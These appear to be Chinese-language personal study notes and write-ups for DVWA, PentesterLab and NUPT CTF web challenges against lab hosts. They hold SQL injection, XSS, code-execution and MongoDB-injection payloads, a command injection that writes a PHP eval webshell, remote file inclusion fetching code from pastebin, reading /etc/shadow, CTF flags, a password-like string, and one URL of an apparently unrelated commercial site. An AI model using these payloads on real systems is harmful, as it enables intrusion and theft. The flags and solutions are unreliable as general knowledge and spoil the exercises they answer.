﻿靶场IP：60.219.238.35
DVWA
{
一、brute force
1.low 
直接带入burp抓包破解

2.medium
万能密码、暴力破解

3.high
user-token防爆破
	源代码：	
Brute Force Source
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = mysql_real_escape_string( $user );

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = mysql_real_escape_string( $pass );
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        // Get users details
        $avatar = mysql_result( $result, 0, "avatar" );

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    mysql_close();
}

// Generate Anti-CSRF token
generateSessionToken();

?>


表单：
		<form action="#" method="GET">
			Username:<br />
			<input type="text" name="username"><br />
			Password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password"><br />
			<br />
			<input type="submit" value="Login" name="Login">
			<input type='hidden' name='user_token' value='7512b884cbe9d6a475b9a87ad2f6d139' />
		</form>
		
	python脚本破解	
4.impossible

二、命令执行
1.low
&,&&,||,|，>>
whoami
pwd
重定向：&echo hello >> 1.txt
192.168.1.1 & echo "<?php eval($_POST['123']);?>" >> 1.php
2.medium
换行%0D、%OA绕过过滤,管道符|
3.high
管道符|

4.一句话木马

三、sql注入
1.low无过滤
语句：1' or 1=1 #
2.medium POST注入，过滤特殊字符
http://localhost/dvwa-1.9/vulnerabilities/sqli/#
id=1  union select user(),2&Submit=Submit
3.high 手工注入
session，换页面防工具注入
4.注入工具
sqlmap
pangolin、havij
啊D、明小子
navicat

四、文件包含
1.low
直接远程包含
本地包含/etc/shadow
本地包含敏感文件
2.medium
远程str_place过滤http://、https://
本地过滤../
远程包含使用双写绕过替换hthttp://tp://
本地包含使用绝对路径C:/
3.high
fnmatch:文件名需要以file://开头
结合上传漏洞，包含本地一句话
4.impossible

五、XSS-reflect
1.low
<script>alert(1)</script>
2.medium
<scRIpt>alert(1)</script>
3.high
<img src=1 onerror="alert(1)">
4.impossible

六、XSS-store
1.low
<script>alert(1)</script>
2.medium
<scRIpt>alert(1)</script>
3.high
过滤script标签
<img src=1 onerror="alert(1)">
4.impossible
}

sqli
{
	
}

pentesterlabI
{
地址：http://218.9.118.151:5677
	sql注入：
	{
	1.字符型注入
		手工：
		' and '1'='1
		' and 1=1 %23(或#或-- 1234)
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example1.php?name=root
	2.过滤空格（\t,%09,+)
		'%09and%091=1%09%23
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example2.php?name=root --tamper tamper/space2comment.py
	3.过滤空格、tab等键
		注释符替代/**/
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example3.php?name=root --tamper tamper/space2comment.py
	4.简单数字型注入
		mysql_real_escape_string
		直接注入
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example5.php?id=4
	5.preg_match('/~[0-9]+/',$_GET['id'])
		以数字开头
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example5.php?id=2
	6.preg_match('/~[0-9]+$/',$_GET['id'])
		以数字结尾
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example6.php?id=2 --suffix="%23 123"
	7.preg_match('/~-?[0-9]+$/m',$_GET['id'])
		换行符绕过
		123%0Apayload
		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example7.php?id=2 --prefix="123%0A"
	8.order by 注入
		order by 不可以套用单双引号
		反单引号时间延迟注入
		order by `name`,1  #
		name` desc %23
		sqlmap:
		sqlmap.py -u 10.0.1.137/sqli/example8.php?order=name --prefix="` " --suffix=" %23" --level 3 --tables -v 3
		Payload: order=name`  RLIKE (SELECT (CASE WHEN (7239=7239) THEN 0x6e616d65 ELSE 0x28 END)) #
	9.bool型盲注
	手工：if(0,age,name)
	sqlmap:
	    Payload: order=(SELECT (CASE WHEN (9442=9442) THEN 9442 ELSE 9442*(SELECT 9442 FROM INFORMATION_SCHEMA.PLUGINS) END))
	}	
	文件包含：
	{
		example1:
			远程文件包含
			http://10.0.1.137/fileincl/example2.php?page=https://pastebin.com/raw/7vMVxa9Y
		example2:
			程序自动为链接加.php,需要通过#锚点注释掉后面的内容
			http://10.0.1.137/fileincl/example2.php?page=https://pastebin.com/raw/7vMVxa9Y%23
	}	
	XSS:
	{
		ex1:无过滤
			<script>alert(1)</script>
		ex2:过滤<script>、</script>
			未过滤大小写
			<sCript>alert(1)</sCript>
		ex3:过滤<script>、</script>，包括大小写
			<img src="" onerror="alert(1)">
		ex4:
			<img src="" onerror="alert(1)">
		ex5:过滤alert
			<script>eval(string.fromCharCode(97,108,101,114,116,40,48,41))</script>
			<img src="" onerror="confirm(1)">
			alert()、confirm()、prompt()
		ex6:将传入的参数直接传入SCRIPT内的变量
			1";alert(1);"
		ex7:将传入的参数直接传入SCRIPT内的变量
			1';alert(1);'
		ex8:htmlspecialchars
			访问example8.php/payload,可直接带入example8.php
			http://10.0.1.137/xss/example8.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C!--
			http://10.0.1.137/xss/example8.php/"><script>alert(1)</script><form action=" 
		ex9:锚点
			document.write(location.hash.substring(1));
			不同浏览器支持不同:#<script>alert(1)</script>
	}
	
	
	
	代码执行
	{
		example1:
			字符串连接符
			http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();//
			http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();$dummy="
			
			
		example2:		
			http://218.9.118.151:5677/codeexec/example2.php?order=id);}phpinfo();//
		
		example3:	
			preg_replace/e
			http://218.9.118.151:5677/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer
		
		
		example4:
			assert()
			http://218.9.118.151:5677/codeexec/example4.php?name=hacker'.phpinfo().'
			
			http://218.9.118.151:5677/codeexec/example4.php?name=hacker'.show_source("/var/www/codeexec/example3.php") .'
		
	}
}



pentesterlabII
{
	参考文档
		http://blog.csdn.net/qq_32400847/article/details/54425379
		https://pentesterlab.com/exercises/web_for_pentester_II/course
	练习地址：
		http://60.219.238.35:5678/
	答案解析
	{
		sql注入：
		{
			1.万能密码
			payload:http://60.219.238.35:5678/sqlinjection/example1/?username=admin' or 1=1 %23&password=1&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
		
			2.报错型注入
			payload:60.219.238.35:5678/sqlinjection/example2/?username='+union+select+1,2,3%23&password=&submit=提交查询
			
			3.过滤'
			闭合绕过'
			http://60.219.238.35:5678/sqlinjection/example3/?username=\&password=' or 1=1 %23&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
			
			4.where字段直接查询
			select * from users where [req content]
			and extractvalue(1, concat(0x5e7e5e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))#		//table_name
			and extractvalue(1, concat(0x5e7e5e,(select concat(column_name) from information_schema.columns where table_schema=database() limit 2,1)))#		//column_name
			and extractvalue(1, concat(0x5e7e5e,(select concat(password) from users limit 0,1)))#
			and extractvalue(1, concat(0x5e7e5e,(select concat(id,username,password) from users limit 0,1)))#
			and extractvalue(1, concat((select concat(password) from users limit 3,1)))#  //注出密码
			1ed2b44c2f006040e34205455226e695
			
			5.注入点为limit=3
			union select database(),USER(),3
			sqlmap.py -u http://60.219.238.35:5678/sqlinjection/example5/?limit=1
			
			6.注入点为group
			union select 1,2,3
			http://60.219.238.35:5678/sqlinjection/example6/?group=username%20union%20select%20database(),user(),3
			
			7.基于时间来注入
			查询语句：SELECT * FROM users WHERE id=1 order by 10 
			and if(length(database())=21,sleep(3),0)
			sqlmap.py -u http://60.219.238.35:5678/sqlinjection/example7/?id=1
		
			8.二次注入
			a' union select 1,2,3%23
			a' union select database(),user(),3#
			http://60.219.238.35:5678/sqlinjection/example8/
			pentesterlab@localhost
			sqlinjection_example8
			
			9.宽字符注入
			http://60.219.238.35:5678/sqlinjection/example9/?username=admin%df%27 or 1=1%23&password=&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
			
			def sql9():
				url = "http://10.108.40.237/sqlinjection/example9/?username=a%{}%27%20or%201=1%23&password=a&submit=Submit"
				for x in xrange(255):
					char = hex(x)[2:]
					if len(char) == 1:
						char = "0" + char
					html = requests.get(url.format(char))
					if "Success" in html.text:
						print "[+] 0x{} works".format(char)
					print "Done"

		
		
		
		}
		
		Authentication：
		{
			1.弱口令 http basic认证
			http://60.219.238.35:5678/authentication/example1/
			2.字典暴破、字符串的对比
			hacker,p4ssw0rd
			3.cookie验证
			http://60.219.238.35:5678/authentication/example3/
			修改cookie为admin
			
			4.cookie验证，MD5加密
			修改cookie为：21232f297a57a5a743894a0e4a801fc3
			5.用户名密码验证
			在MySQL中大小写不敏感绕过
			注册一个Admin
			
			6.用户名密码验证
			过滤大小写
			后面加空格类符号绕过：space,+,\t
		}
		
		Captcha
		{
			1.虚假验证
			抓包，删除链接中captcha=1
			
			2.form中有captcha
			<form action="submit" action="get">
				<img src="captcha.png?t=1500390283.0342271"/ > 
				Answer: <input type="text" name="captcha"/>
				<input type="hidden" name="answer" value="SIDc_rKUXd"/>
				<input type="submit" name="submit"/>
			</form>
			py请求表单，正则匹配，捕获captcha
			
			3.从cookie读取captcha
			py读取cookie
			
			4.这道题其实并没有理解是什么意思。官方解答是不必真正的暴破验证码，只需要破解一次然后可以重复使用相同的值和sessionid。
			
			5.多提交几次，就会发现这个验证码样本很少。我们可以把它都保存下来，然后每次用验证码与保存下来的做对比。先提前把所有文件保存在代码目录的pic文件夹里，文件名是验证码的内容
			
			7.第六题与第七题都可以用tesseract来识别，不需要做其它的操作。第六题的识别率比较高，第七题的识别率比较低，可以多试几次。
			
			8.验证码需要做一些处理，先放在这里以后再做
			
			9.验证码是题解并且不是写在图片上的，可以直接正则匹配出来然后计算识别提交
		}
		
		Authorization
		{
			1.未授权访问
			http://60.219.238.35:5678/authorization/example1/infos/1
			
			2.水平权限提升
			http://60.219.238.35:5678/authorization/example2/infos/3
			
			3.使用user1的帐户访问user2的内容
			http://60.219.238.35:5678/authorization/example3/infos/edit/3
		}
		
		Mass Assignment
		{
			原理：对象关系映射(Object-relational mapping)以方便不懂sql的开发人员来做数据库的操作。
				在ruby中，可以用@user=User.find_by_name('pentesterlab')来进行数据库的查询与结果的返回，除此之外还有创建与更新等操作。
				但这并不能保证安全性，如果开发人员没有对参数做好判断，就会出现重置某些属性的问题，这就是覆盖属性。
				
			1. 目的是创建个admin权限的用户。观察参数，发现是user[username]=&user[password]= 那么我们试着添加一个admin 属性。
				http://p0.qhimg.com/t013e9912e9c8a617df.png

			2. 目的同1一样，创建一个admin权限的用户。但是在创建时并不行。那么我们创建一个普通用户进去，发现有一个更新简历，那么在更新处添加admin属性就可以。
				http://p8.qhimg.com/t017d691557d755ff26.png
			
			3. 同前2个差不多，但是这里要猜一个company_id的字段。因为在一对多的结构中，即一个company对应多个user，那么在user表中会多一个company_id的外键指向company表。
				http://p5.qhimg.com/t0146e54734460b0914.png
			
		}
		
		Randomness Issues
		{
			
		}
		
		MongoDB injection
		{
			1.构造真值等式绕过密码验证
			http://60.219.238.35:5678/mongodb/example1/?username=hacker' || 1==1//&password=hacker
			
			2.注入password字段
			60.219.238.35:5678/mongodb/example2/?search=admin' && this.password.match(/./)//+%00
			python脚本：
			密码：icanhazpassw0rd
		}
	}
}

橡木盾CTF平台
{
绩9iRVJRz%!a7#mdvY

}

南邮CTF-writeup
{
三个老斯基来1发
19920211

game19
http://way.nuptzj.cn/web6/
http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw
way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA==
nctf{download_any_file_666}

sql injection 3
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27 or 1=1 union select flag from flag %23


system
tips:其他题目的源码我也放出来了，题目地址：http://139.199.71.170:44227/

github:https://github.com/otakekumi/NUPT_Challenges

虽然可以直接来这儿找，但还是好好做吧，来源：CSAW2016，汉化来自:Jarvis OJ

http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php
http://www.backstagecommerce.ca/services.php?id=4

密码重置
http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D
user=admin&newpass=1234&vcode=1234
nctf{reset_password_often_have_vuln}

php 反序列化
http://115.28.150.176/php1/index.php?pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
nctf{serialize_and_unserialize}


sql injection 4
300
http://chinalover.sinaapp.com/web15/index.php?username=\&password=or%201%3D1%20%23
flag:nctf{sql_injection_is_interesting}

综合题
300
1bc29b36f623ba82aaf6724fd3b16718.php
http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history
flagbak.zip
flag is:nctf{bash_history_means_what}

sql注入II
http://4.chinalover.sinaapp.com/web6/index.php
user=' union select md5(1)#&pass=1
ntcf{union_select_is_wtf}
}

